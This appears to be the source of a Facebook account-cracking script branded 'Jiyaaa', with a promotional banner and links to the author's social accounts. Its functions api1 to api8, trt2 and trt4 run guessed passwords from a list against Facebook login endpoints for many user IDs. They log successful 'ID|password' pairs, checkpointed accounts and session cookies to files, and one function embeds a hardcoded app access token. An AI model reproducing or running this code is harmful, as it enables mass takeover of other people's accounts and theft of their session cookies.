...
print('[•] Follow My Account and Wait....\033[91;1m')
os.system('xdg-open https://www.facebook.com/profile.php?id=100078087180486&mibextid=ZbWKwL')
...
logo = ("""\033[1;32m 
    \033[1;37m----------------------------------------
    \033[91;1m   ___ _______   _____    ___    ___  
    \033[92;1m  |_  |_   _\ \ / / _ \  / _ \  / _ \ 
    \033[97;1m    | | | |  \ V / /_\ \/ /_\ \/ /_\ \

    \033[93;1m/\__/ /_| |_  | || | | || | | || | | |
    \033[95;1m\____/ \___/  \_/\_| |_/\_| |_/\_| |_/ 
    \033[1;37m----------------------------------------
\033[91;1m'SAREEF BALAK VIKASH JIYAAA KA PATI BOLTI PUBLIC'
    \033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
    \033[;32mMAZA NA AYE PASSY WAPIS 😁🖕
 \033[1;37m------------------------------------------
    \033[91;1mSubscribe on YouTube @vikashbadshah 
 \033[1;37m------------------------------------------
 \033[1;32m╔════════════════════════════════════════╗

      \033[1;36mAuther      :   VIKASH KING 👑
      \033[1;32mYouTube     :   Vikashbadshah
      \033[1;35mFecbook     :   VIKASH ❤️ JIYAAA 
      \033[1;32mAdmin       :   VIKASH KING 👑
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				...
				linex()
				file = input(' Put file path\033[91;1m')
				try:
				...
				os.system('xdg-open https://chat.whatsapp.com/LbSdjbaUVx59g5EXsH3ng2')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [Jiyaaa-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/Jiyaaa-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/Jiyaaa-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/Jiyaaa-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Jiyaaa-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Jiyaaa-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Jiyaaa-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/Jiyaaa-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Jiyaaa-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [Jiyaaa-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Jiyaaa-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SK:
				...
				print('\r\r\033[1;32m [Jiyaaa-OK] %s | %s'%(ids,pas))
				open('/sdcard/Jiyaaa-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Jiyaaa-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Jiyaaa-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [Jiyaaa-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Jiyaaa-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Jiyaaa-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/Jiyaaa-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [Jiyaaa-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/Jiyaaa-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Jiyaaa-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [Jiyaaa-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [Jiyaaa-OK] '+uid+' | '+pas)
						open('/sdcard/Jiyaaa-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [Jiyaaa-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/Jiyaaa-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
